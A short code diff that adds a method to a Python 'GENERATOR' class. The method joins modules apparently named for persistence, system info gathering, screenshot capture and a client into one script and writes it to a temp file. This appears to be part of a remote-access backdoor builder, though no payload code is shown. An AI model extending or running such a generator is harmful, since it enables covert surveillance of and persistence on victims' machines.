@@ -679,3 +679,16 @@ class GENERATOR:
         time.sleep(2)
         pull.print("Code Generated Successfully")
         pull.print("File: " + self.output)
+    
+    def generate(self):
+        time.sleep(2)
+        pull.function("compiling modules......")
+        self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
+                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
+        time.sleep(2)
+        pull.function("Generating one time code for binary")
+        self.flname = self.tmp_dir()
+        fl = open(self.flname[1], 'w')
+        fl.write(self.data)
+        fl.close()
+        pull.print("Code generated successfully!")
